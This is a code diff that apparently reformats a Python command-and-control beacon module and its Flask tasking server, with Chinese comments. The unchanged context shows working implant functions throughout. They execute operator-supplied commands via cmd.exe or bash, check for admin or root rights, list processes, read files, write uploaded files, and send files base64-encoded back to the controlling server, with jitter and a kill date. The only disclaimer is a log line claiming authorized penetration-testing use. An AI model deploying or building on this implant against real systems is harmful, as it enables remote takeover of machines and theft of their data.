@@ -13,36 +13,35 @@ Beacon 通信模块 - Beacon Communication Module
     - 自动重连
 """
 
+import hashlib
+import json
+import logging
 import os
+import platform
+import socket
+import subprocess
 import sys
+import threading
 import time
 import uuid
-import json
-import socket
-import platform
-import subprocess
-import threading
-import hashlib
-import logging
-from typing import Optional, Dict, List, Any, Callable
 from dataclasses import dataclass, field
 from enum import Enum
+from typing import Any, Callable, Dict, List, Optional
 
-from .base import (
-    BaseC2, C2Config, C2Status, Task, TaskResult, BeaconInfo, TaskTypes
-)
+from .base import BaseC2, BeaconInfo, C2Config, C2Status, Task, TaskResult, TaskTypes
 from .crypto import C2Crypto, CryptoAlgorithm
-from .protocol import ProtocolCodec, encode_heartbeat, decode_tasks, encode_result
-from .tunnels import create_tunnel, BaseTunnel
+from .protocol import ProtocolCodec, decode_tasks, encode_heartbeat, encode_result
+from .tunnels import BaseTunnel, create_tunnel
 
 logger = logging.getLogger(__name__)
 
 
 class BeaconMode(Enum):
     """Beacon 运行模式"""
-    INTERACTIVE = 'interactive'     # 交互模式（低延迟）
-    SLEEP = 'sleep'                 # 睡眠模式（正常心跳）
-    LOW = 'low'                     # 低频模式（长间隔）
+
+    INTERACTIVE = "interactive"  # 交互模式（低延迟）
+    SLEEP = "sleep"  # 睡眠模式（正常心跳）
+    LOW = "low"  # 低频模式（长间隔）
 
 
 @dataclass
@@ -52,18 +51,19 @@ class BeaconConfig(C2Config):
 
     继承 C2Config 并添加 Beacon 特定配置
     """
+
     # 端点配置（覆盖默认值）
-    checkin_endpoint: str = '/api/checkin'
-    task_endpoint: str = '/api/tasks'
-    result_endpoint: str = '/api/results'
+    checkin_endpoint: str = "/api/checkin"
+    task_endpoint: str = "/api/tasks"
+    result_endpoint: str = "/api/results"
 
     # Beacon 特定配置
-    initial_delay: float = 0.0      # 启动延迟
+    initial_delay: float = 0.0  # 启动延迟
     kill_date: Optional[float] = None  # 自毁日期（时间戳）
 
     # 执行配置
-    shell_timeout: int = 60         # Shell 命令超时
-    max_output_size: int = 10000    # 最大输出大小
+    shell_timeout: int = 60  # Shell 命令超时
+    max_output_size: int = 10000  # 最大输出大小
 
     def __post_init__(self):
         """初始化后处理"""
@@ -147,7 +147,7 @@ class Beacon(BaseC2):
         self._crypto: Optional[C2Crypto] = None
 
         # 初始化加密
-        if config.encryption != 'none' and config.key:
+        if config.encryption != "none" and config.key:
             self._crypto = C2Crypto(config.encryption, config.key)
             self._codec = ProtocolCodec(crypto=self._crypto, compress=True)
 
@@ -181,17 +181,18 @@ class Beacon(BaseC2):
             logger.debug(f"Failed to get local IP: {e}")
 
         # 检测完整性级别
-        integrity = 'medium'
-        if platform.system() == 'Windows':
+        integrity = "medium"
+        if platform.system() == "Windows":
             try:
                 import ctypes
+
                 if ctypes.windll.shell32.IsUserAnAdmin():
-                    integrity = 'high'
+                    integrity = "high"
             except (ImportError, AttributeError, OSError) as e:
                 logger.debug(f"Failed to check admin status: {e}")
 
         elif os.geteuid() == 0:
-            integrity = 'high'
+            integrity = "high"
 
         return BeaconInfo(
             beacon_id=self.beacon_id,
@@ -236,7 +237,7 @@ class Beacon(BaseC2):
                 protocol=self.config.protocol,
                 server=self.config.server,
                 port=self.config.port,
-                config=self.config
+                config=self.config,
             )
 
             # 连接隧道
@@ -280,8 +281,10 @@ class Beacon(BaseC2):
         self.disconnect()
 
         for attempt in range(self.config.max_retries):
-            delay = self.config.retry_delay * (2 ** attempt)
-            logger.info(f"Reconnecting in {delay:.1f}s (attempt {attempt + 1}/{self.config.max_retries})")
+            delay = self.config.retry_delay * (2**attempt)
+            logger.info(
+                f"Reconnecting in {delay:.1f}s (attempt {attempt + 1}/{self.config.max_retries})"
+            )
             # 使用 _stop_event.wait 支持中断
             if self._stop_event.wait(delay):
                 return False  # 被中断
@@ -410,9 +413,7 @@ class Beacon(BaseC2):
                     return
 
                 self._thread = threading.Thread(
-                    target=self._beacon_loop,
-                    daemon=True,
-                    name=f"Beacon-{self.beacon_id[:8]}"
+                    target=self._beacon_loop, daemon=True, name=f"Beacon-{self.beacon_id[:8]}"
                 )
                 self._thread.start()
                 self._starting = False  # 启动完成
@@ -551,6 +552,7 @@ class Beacon(BaseC2):
     def _calculate_sleep(self) -> float:
         """计算带抖动的睡眠时间"""
         import secrets
+
         base = self.config.interval
         jitter = base * self.config.jitter
 
@@ -621,14 +623,14 @@ class Beacon(BaseC2):
                     ["cmd.exe", "/c", command],
                     capture_output=True,
                     text=True,
-                    timeout=self.config.shell_timeout
+                    timeout=self.config.shell_timeout,
                 )
             else:
                 result = subprocess.run(
                     ["/bin/bash", "-c", command],
                     capture_output=True,
                     text=True,
-                    timeout=self.config.shell_timeout
+                    timeout=self.config.shell_timeout,
                 )
 
             output = result.stdout
@@ -636,7 +638,7 @@ class Beacon(BaseC2):
                 output += f"\n[STDERR]\n{result.stderr}"
 
             # 限制输出大小
-            return output[:self.config.max_output_size]
+            return output[: self.config.max_output_size]
 
         except subprocess.TimeoutExpired:
             return "[Error] Command timed out"
@@ -647,8 +649,8 @@ class Beacon(BaseC2):
         """修改睡眠时间"""
         try:
             if isinstance(payload, dict):
-                interval = payload.get('interval', payload.get('time'))
-                jitter = payload.get('jitter')
+                interval = payload.get("interval", payload.get("time"))
+                jitter = payload.get("jitter")
             else:
                 interval = int(payload)
                 jitter = None
@@ -695,13 +697,13 @@ class Beacon(BaseC2):
                 full_path = os.path.join(target, entry)
                 try:
                     stat = os.stat(full_path)
-                    is_dir = 'd' if os.path.isdir(full_path) else '-'
+                    is_dir = "d" if os.path.isdir(full_path) else "-"
                     size = stat.st_size
                     entries.append(f"{is_dir} {size:>10} {entry}")
                 except (OSError, PermissionError):
                     entries.append(f"? {'?':>10} {entry}")
 
-            return '\n'.join(entries)
+            return "\n".join(entries)
 
         except (OSError, FileNotFoundError, PermissionError) as e:
             return f"[Error] Cannot list directory: {e}"
@@ -709,9 +711,9 @@ class Beacon(BaseC2):
     def _handle_cat(self, path: str) -> str:
         """读取文件内容"""
         try:
-            with open(path, 'r', encoding='utf-8', errors='replace') as f:
+            with open(path, "r", encoding="utf-8", errors="replace") as f:
                 content = f.read()
-            return content[:self.config.max_output_size]
+            return content[: self.config.max_output_size]
         except (OSError, FileNotFoundError, PermissionError) as e:
             return f"[Error] Cannot read file: {e}"
 
@@ -719,20 +721,10 @@ class Beacon(BaseC2):
         """列出进程"""
         try:
             if platform.system() == "Windows":
-                result = subprocess.run(
-                    ["tasklist"],
-                    capture_output=True,
-                    text=True,
-                    timeout=30
-                )
+                result = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=30)
             else:
-                result = subprocess.run(
-                    ["ps", "aux"],
-                    capture_output=True,
-                    text=True,
-                    timeout=30
-                )
-            return result.stdout[:self.config.max_output_size]
+                result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=30)
+            return result.stdout[: self.config.max_output_size]
         except subprocess.TimeoutExpired:
             return "[Error] Process list timed out"
         except (OSError, subprocess.SubprocessError) as e:
@@ -742,14 +734,15 @@ class Beacon(BaseC2):
         """上传文件到目标"""
         try:
             import base64
-            path = payload.get('path')
-            content_b64 = payload.get('content')
+
+            path = payload.get("path")
+            content_b64 = payload.get("content")
 
             if not path or not content_b64:
                 return "[Error] Missing path or content"
 
             content = base64.b64decode(content_b64)
-            with open(path, 'wb') as f:
+            with open(path, "wb") as f:
                 f.write(content)
 
             return f"Uploaded {len(content)} bytes to {path}"
@@ -763,20 +756,22 @@ class Beacon(BaseC2):
         """从目标下载文件"""
         try:
             import base64
-            with open(path, 'rb') as f:
+
+            with open(path, "rb") as f:
                 content = f.read()
 
             return {
-                'path': path,
-                'content': base64.b64encode(content).decode(),
-                'size': len(content)
+                "path": path,
+                "content": base64.b64encode(content).decode(),
+                "size": len(content),
             }
 
         except (OSError, FileNotFoundError, PermissionError) as e:
-            return {'error': f"Cannot read file: {e}"}
+            return {"error": f"Cannot read file: {e}"}
 
 
 # ==================== Beacon 服务器 ====================
+
 
 class BeaconServer:
     """
@@ -790,10 +785,10 @@ class BeaconServer:
     """
 
     # 默认配置：防止内存泄漏
-    DEFAULT_MAX_BEACONS = 1000          # 最大 Beacon 数量
+    DEFAULT_MAX_BEACONS = 1000  # 最大 Beacon 数量
     DEFAULT_MAX_RESULTS_PER_BEACON = 100  # 每个 Beacon 最大结果数
-    DEFAULT_BEACON_TIMEOUT = 3600       # Beacon 超时时间（秒）
-    DEFAULT_CLEANUP_INTERVAL = 300      # 清理间隔（秒）
+    DEFAULT_BEACON_TIMEOUT = 3600  # Beacon 超时时间（秒）
+    DEFAULT_CLEANUP_INTERVAL = 300  # 清理间隔（秒）
 
     def __init__(
         self,
@@ -821,7 +816,7 @@ class BeaconServer:
 
         # 存储
         self.beacons: Dict[str, BeaconInfo] = {}
-        self.tasks: Dict[str, List[Task]] = {}      # beacon_id -> tasks
+        self.tasks: Dict[str, List[Task]] = {}  # beacon_id -> tasks
         self.results: Dict[str, List[TaskResult]] = {}  # beacon_id -> results
 
         # 线程锁
@@ -877,7 +872,7 @@ class BeaconServer:
             results_list = self.results[beacon_id]
             if len(results_list) > self.max_results_per_beacon:
                 # 保留最新的结果
-                self.results[beacon_id] = results_list[-self.max_results_per_beacon:]
+                self.results[beacon_id] = results_list[-self.max_results_per_beacon :]
 
     def _cleanup_loop(self) -> None:
         """后台清理循环"""
@@ -889,13 +884,7 @@ class BeaconServer:
                 except Exception as e:
                     logger.error(f"清理 Beacon 失败: {e}")
 
-    def add_task(
-        self,
-        beacon_id: str,
-        task_type: str,
-        payload: Any,
-        timeout: float = 300.0
-    ) -> str:
+    def add_task(self, beacon_id: str, task_type: str, payload: Any, timeout: float = 300.0) -> str:
         """
         添加任务（线程安全）
 
@@ -931,7 +920,7 @@ class BeaconServer:
     def run(self) -> None:
         """运行服务器"""
         try:
-            from flask import Flask, request, jsonify
+            from flask import Flask, jsonify, request
         except ImportError:
             logger.error("Flask not installed. Install: pip install flask")
             return
@@ -939,27 +928,29 @@ class BeaconServer:
         app = Flask(__name__)
         self._app = app
 
-        @app.route('/api/checkin', methods=['POST'])
+        @app.route("/api/checkin", methods=["POST"])
         def checkin():
             data = request.json
-            beacon_id = data.get('beacon_id')
+            beacon_id = data.get("beacon_id")
 
             if beacon_id:
                 with self._beacons_lock:
                     if beacon_id not in self.beacons:
                         # 检查是否超过最大 Beacon 数量
                         if len(self.beacons) >= self.max_beacons:
-                            logger.warning(f"达到最大 Beacon 数量限制 ({self.max_beacons})，拒绝新连接")
+                            logger.warning(
+                                f"达到最大 Beacon 数量限制 ({self.max_beacons})，拒绝新连接"
+                            )
                             return jsonify({"status": "error", "message": "server full"}), 503
 
                         self.beacons[beacon_id] = BeaconInfo(
                             beacon_id=beacon_id,
-                            hostname=data.get('hostname', ''),
-                            username=data.get('username', ''),
-                            os_info=data.get('os_info', ''),
-                            arch=data.get('arch', ''),
-                            ip_address=data.get('ip_address', ''),
-                            pid=data.get('pid', 0),
+                            hostname=data.get("hostname", ""),
+                            username=data.get("username", ""),
+                            os_info=data.get("os_info", ""),
+                            arch=data.get("arch", ""),
+                            ip_address=data.get("ip_address", ""),
+                            pid=data.get("pid", 0),
                         )
                         logger.info(f"New beacon: {beacon_id}")
                     else:
@@ -969,7 +960,7 @@ class BeaconServer:
 
             return jsonify({"status": "error"}), 400
 
-        @app.route('/api/tasks/<beacon_id>', methods=['GET'])
+        @app.route("/api/tasks/<beacon_id>", methods=["GET"])
         def get_tasks(beacon_id):
             with self._tasks_lock:
                 tasks = self.tasks.get(beacon_id, [])
@@ -977,10 +968,10 @@ class BeaconServer:
 
                 task_data = [
                     {
-                        'id': t.id,
-                        'type': t.type,
-                        'payload': t.payload,
-                        'timeout': t.timeout,
+                        "id": t.id,
+                        "type": t.type,
+                        "payload": t.payload,
+                        "timeout": t.timeout,
                     }
                     for t in pending
                 ]
@@ -991,16 +982,16 @@ class BeaconServer:
 
             return jsonify({"tasks": task_data})
 
-        @app.route('/api/results', methods=['POST'])
+        @app.route("/api/results", methods=["POST"])
         def receive_result():
             data = request.json
-            beacon_id = data.get('beacon_id')
+            beacon_id = data.get("beacon_id")
 
             result = TaskResult(
-                task_id=data.get('task_id', ''),
-                success=data.get('success', False),
-                output=data.get('output'),
-                error=data.get('error'),
+                task_id=data.get("task_id", ""),
+                success=data.get("success", False),
+                output=data.get("output"),
+                error=data.get("error"),
             )
 
             with self._results_lock:
@@ -1018,9 +1009,7 @@ class BeaconServer:
 
         # 启动后台清理线程
         self._cleanup_thread = threading.Thread(
-            target=self._cleanup_loop,
-            daemon=True,
-            name="BeaconServer-Cleanup"
+            target=self._cleanup_loop, daemon=True, name="BeaconServer-Cleanup"
         )
         self._cleanup_thread.start()
 
@@ -1092,12 +1081,13 @@ class BeaconServer:
 
 # ==================== 便捷函数 ====================
 
+
 def create_beacon(
     server: str,
     port: int = 443,
-    protocol: str = 'https',
+    protocol: str = "https",
     interval: float = 60.0,
-    encryption_key: Optional[str] = None
+    encryption_key: Optional[str] = None,
 ) -> Beacon:
     """
     创建 Beacon 实例
@@ -1122,10 +1112,7 @@ def create_beacon(
     return Beacon(config)
 
 
-def start_beacon_server(
-    host: str = "0.0.0.0",
-    port: int = 8080
-) -> BeaconServer:
+def start_beacon_server(host: str = "0.0.0.0", port: int = 8080) -> BeaconServer:
     """
     启动 Beacon 服务器
 
@@ -1142,17 +1129,17 @@ def start_beacon_server(
 
 
 __all__ = [
-    'BeaconMode',
-    'BeaconConfig',
-    'Beacon',
-    'BeaconServer',
-    'create_beacon',
-    'start_beacon_server',
+    "BeaconMode",
+    "BeaconConfig",
+    "Beacon",
+    "BeaconServer",
+    "create_beacon",
+    "start_beacon_server",
 ]
 
 
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
     logger.info("Beacon Module - Lightweight C2 Beacon")
     logger.info("=" * 50)
     logger.warning("[!] This module is for authorized penetration testing only!")
